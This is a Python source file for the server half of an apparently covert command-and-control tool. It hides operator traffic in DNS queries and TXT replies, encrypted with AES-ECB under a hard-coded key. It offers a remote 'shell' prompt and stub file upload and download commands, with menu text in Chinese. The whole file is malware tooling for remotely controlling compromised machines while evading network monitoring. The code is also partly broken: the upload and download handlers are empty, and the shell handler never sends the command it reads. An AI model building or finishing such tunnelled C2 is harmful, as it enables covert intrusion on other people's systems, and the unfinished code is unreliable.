import socket
import dnslib
from Crypto.Cipher import AES
import base64

class Server:
    def __init__(self,host,port):
        self.host=host
        self.port=port

    def connects(self):
        global s,address
        he = ['cmd--->命令行交互','upload--->文件上传','download--->文件下载','exit--->退出']
        hps={'cmd': self.cmd,'upload':self.upload,'download':self.download,'exit':exit}
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.bind((self.host,int(self.port)))
        data,address=s.recvfrom(1024)
        print('[+] 来源IP:{},来源端口:{}'.format(address[0],address[1]))
        dnsj=self.dnsj(data)
        demo=self.jiemi(dnsj[1])
        if demo:
            print('[+] {}:{}<---->{}:{}'.format(self.host,self.port,address[0],address[1]))
            print('+请执行你的操作，如果有问题请输入help')
            while True:
                demos=self.jiami('demo')
                fs=self.dnsc(dnsj[0],demos)
                s.sendto(fs.pack(),address)
                xw=input('Jarvis:')
                if xw in hps:
                    hps[xw]()
                if xw=='help':
                    print('')
                    for h in he:
                        print(h)


    def dnsj(self,data):
        dr=dnslib.DNSRecord.parse(data)
        answer=dr.reply()
        return answer,dr.questions[0].qname.label[0]

    def dnsc(self,answer,data):
        answer.add_answer(*dnslib.RR.fromZone('{}.com 60 TXT'.format(data)))
        return answer

    def add_to_16(self,text):
        while len(text) % 16 != 0:
            text += '\0'
        return str.encode(text)

    def jiami(self,data):
        key = 'DD194FB8BA97C8BFDA635E3CE76809A2'
        text = str(data)
        aes = AES.new(key, AES.MODE_ECB)
        encrypd = str(base64.encodebytes(aes.encrypt(self.add_to_16(text))), encoding='utf-8').replace('\n', '')
        return encrypd

    def jiemi(self,data):
        key = 'DD194FB8BA97C8BFDA635E3CE76809A2'
        aes=AES.new(key,AES.MODE_ECB)
        decode_encrypd = aes.decrypt(base64.decodebytes(data))
        return bytes.decode(decode_encrypd).rstrip('\0')

    def cmd(self):
        js,address=s.recvfrom(1024)
        jx=self.dnsj(js)
        jm=self.jiemi(jx[1])
        if jm:
            demos = self.jiami('cmd')
            fs = self.dnsc(jx[0], demos)
            s.sendto(fs.pack(), address)
            xw=input('shell:')

    def upload(self):
        pass

    def download(self):
        pass

if __name__ == '__main__':
    host='127.0.0.1'
    port=53
    obj=Server(host,port)
    obj.connects()